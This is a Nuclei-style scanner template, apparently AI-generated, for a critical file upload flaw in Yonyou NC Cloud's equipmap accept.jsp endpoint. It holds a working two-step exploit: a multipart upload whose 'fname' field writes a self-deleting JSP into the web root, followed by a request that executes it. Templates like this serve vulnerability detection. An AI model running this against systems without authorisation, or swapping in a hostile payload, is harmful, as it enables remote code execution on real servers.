id: yonyou-nc-cloud-equipmap-accept-writefile

info:
  name: Yonyou NC Cloud Equipmap Accept Write File
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Exploits a file upload vulnerability in Yonyou NC Cloud Equipmap to write a JSP file and execute it.
  reference:
    - https://decoded.avast.io/janneduchal/analysis-of-attack-against-national-games-of-china-systems/

variables:
  random_filename: '{{rand_text_alphanumeric(20)}}'
  random_string: '{{rand_text_alphanumeric(20)}}'
  jsp_filename: '{{rand_text_alphanumeric(20)}}'

http:
  - id: file-upload
    name: Upload File
    method: POST
    path:
      - '{{BaseURL}}/aim/equipmap/accept.jsp'
    headers:
      Content-Type: multipart/form-data; boundary=---------------------------16314487820932200903769468567
    body: |
      -----------------------------16314487820932200903769468567
      Content-Disposition: form-data; name="upload"; filename="{{random_filename}}.txt"
      Content-Type: text/plain

      <% out.println("{{random_string}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
      -----------------------------16314487820932200903769468567
      Content-Disposition: form-data; name="fname"

      \webapps\nc_web\{{jsp_filename}}.jsp
      -----------------------------16314487820932200903769468567--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "afterUpload"

  - id: execute-jsp
    name: Execute JSP
    method: GET
    path:
      - '{{BaseURL}}/{{jsp_filename}}.jsp'
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '{{random_string}}'
